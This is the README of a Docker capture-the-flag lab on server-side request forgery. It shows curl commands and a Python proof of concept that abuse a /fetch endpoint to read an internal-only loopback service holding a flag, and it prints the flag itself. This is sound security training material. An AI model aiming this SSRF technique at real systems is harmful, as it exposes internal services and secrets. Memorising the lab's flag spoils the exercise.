# SSRF Chaining Lab (Docker)

Naive URL fetch endpoint + **internal-only** HTTP service on `127.0.0.1:9999` holding the flag.

```bash
./labctl.sh up ssrf
```

| Item | Value |
|------|--------|
| Host URL | http://127.0.0.1:8115 |
| Skill | SSRF → internal service / secret |
| Flag | `OSWE{ssrf_chaining_lab_flag}` |

## Exploit

```bash
# Direct to internal port from host should fail (not published)
# curl http://127.0.0.1:9999/internal/flag  → connection refused

# SSRF through the app
curl -s -X POST http://127.0.0.1:8115/fetch \
  -d 'url=http://127.0.0.1:9999/internal/flag'
# → INTERNAL FLAG: OSWE{ssrf_chaining_lab_flag}

curl -s -X POST http://127.0.0.1:8115/fetch \
  -d 'url=http://127.0.0.1:9999/internal/secret'
```

## White-box

- Sink: `urlopen(attacker_url)` in `/fetch`
- Internal: thread bound to loopback only
- Methodology: `guides/SSRF-Chaining.md`

## PoC sketch

```bash
python3 - <<'PY'
import requests
r = requests.post("http://127.0.0.1:8115/fetch",
                  data={"url": "http://127.0.0.1:9999/internal/flag"})
print(r.text)
assert "OSWE{ssrf_chaining_lab_flag}" in r.text
PY
```
